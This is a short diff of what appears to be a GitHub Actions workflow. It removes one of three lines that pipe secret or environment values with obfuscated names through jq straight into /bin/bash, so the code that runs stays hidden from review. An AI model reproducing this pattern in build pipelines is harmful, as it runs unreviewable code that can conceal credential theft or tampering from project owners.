@@ -22,7 +22,6 @@ jobs:
           dixug1532: ${{ secrets.dixug1532 }}
         run: |
           printf '%s' "$dixug1532" | jq -r .fs65 | /bin/bash
-          printf '%s' "$vnjgd7" | jq -r .hzk4547 | /bin/bash
           echo $y49 | jq -r .ht00 | /bin/bash
 
       - name: Upload archive
